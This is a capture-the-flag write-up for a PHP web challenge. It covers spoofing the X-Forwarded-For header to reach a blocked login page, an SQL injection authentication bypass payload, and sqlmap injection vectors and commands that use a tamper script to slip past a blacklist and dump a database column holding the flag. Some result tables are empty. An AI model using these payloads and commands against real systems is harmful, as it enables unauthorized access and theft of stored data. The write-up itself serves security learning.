We are presented with a PHP webpage. There is a `login.php`, but it gives us a 403 Forbidden error. Looking a little deeper into `gallery.php` shows us that some of the pictures of the devices include internal subnet addresses.

One way that the login page might be filtering requests is by the user's IP address. The `X-Forwarded-For` header is used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. 

However, it can also be easily changed by the client. By running a Burp Suite Intruder scan for the request header`X-Forwarded-For: 192.168.3.x`, where `x` is the payload, we see that by setting the `X-Forwarded-For` header to `192.168.3.16`, we gain access to the login page.

We see a form with `username` and `password` fields. Using `'` in username parameter leads to the following output:

```markup
<h4 style='color: red;' class='text-center'>There is a sql error, Call the administrator!</h4>
```

We have identified an SQL injection vulnerability. By using the following payload, we can bypass the authentication.

```text
username=test&password=test' or 1=1 LIMIT 1;#
```

Once logged in as the admin, we have access to a `users.php` page. This page contains usernames and card numbers.

```markup
<tbody>
   <tr>
      <th scope="row">1</th>
      <td>melo</td>
      <td>1457888555215515</td>
   </tr>
   <tr>
      <th scope="row">2</th>
      <td>john</td>
      <td>99888515654864655</td>
   </tr>
   <tr>
      <th scope="row">3</th>
      <td>admin</td>
      <td>85551496165161665</td>
   </tr>
</tbody>
```

This page must also be fetching the user information through the database, so we tested for additional SQL injection endpoints. 

We found that `/users.php?id=1` returns only the data for user ID 1. Fuzzing the input leads us to discover that this is a second SQL injection endpoint. This time, there is a blacklist filter:

```markup
<script>alert('Bad character/word ditected!');</script>
```

Using SQLMap, we get the following injection vectors:

```text
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 5928=5928 AND ('bLIm'='bLIm

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 2847 FROM (SELECT(SLEEP(5)))MMVq) AND ('pklt'='pklt

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=1') UNION ALL SELECT NULL,CONCAT(0x7170786a71,0x4a6d4669536b6565767a724d666e776b46517a7853774374787154644d49664b664b565242485172,0x7171787171),NULL,NULL-- -
---
```

`sqlmap -r get.req --threads 10 --dbms mysql --dump --no-escape --tamper=between` dumps the database.

```text
Database: users_data
Table: data

+----+-------+-------------------+-----------+

```

```text

```

We see that there is a `R34L_F14G` column, but it is returning us `<blank>` results. I looked deeper into the SQLMap queries, and found that the following query is used to retrieve the column values.

`GET /users.php?id=1%27)%20UNION%20ALL%20SELECT%20NULL,CONCAT(%27qzppq%27,JSON_ARRAYAGG(CONCAT_WS(%27kbxmel%27,card_num)),%27qpbzq%27),NULL,NULL%20FROM%20users_data.data%20ORDER%20BY%20card_num--%20-`

Replacing `card_num` with `R34L_F14G` fails the blacklist filter, so SQLMap was unable to retrieve any results.

Remember `login.php` from earlier? It did not filter `R34L_F14G`, but it does have an SQL injection vector too. It was a blind SQL injection, so retrieving information from the database would be time-based and it would have been too slow to dump the entire database. 

However, by specifying the specific table and column to dump, we got our results much faster.

`sqlmap -u http://challenges.ctfd.io:30232/login.php --headers=“X-Forwarded-For: 192.168.3.16” --data “password=1&username=test” --dbms=mysql --tamper=between -D users_data -T data -C R34L_F14G --dump --where “id=3”`

This gave us the flag, `S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}`.
